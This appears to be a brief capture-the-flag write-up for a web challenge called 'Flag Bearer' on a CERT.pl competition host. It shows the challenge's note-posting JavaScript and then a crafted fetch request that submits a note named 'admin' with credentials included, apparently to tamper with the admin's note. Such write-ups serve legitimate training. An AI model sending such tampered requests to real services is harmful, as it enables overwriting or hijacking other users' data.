# Flag Bearer - web
![](../images/5c4305df-5a0f-462c-9301-d9c5bf0894d9.png)

```javascript=
let noteForm = document.getElementById("addnote");
noteForm.addEventListener("submit", (e) => {
  e.preventDefault();

  let name = uuidv4()
  let content = document.getElementById("content").value;

  const r = fetch("/notes", {
    method: "POST",
    body: JSON.stringify({
      name: name,
      content: content,
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8"
    }
  }).then((data) => {
    location.reload();
  })
});
```

```javascript=
await fetch("https://flag-bearer.ecsc23.hack.cert.pl/notes", {
    "credentials": "include",
    "headers": {
        "Content-type": "application/json; charset=UTF-8",
    },
    "body": "{\"name\":\"admin\",\"content\":\"asddd\"}",
    "method": "POST"
});
```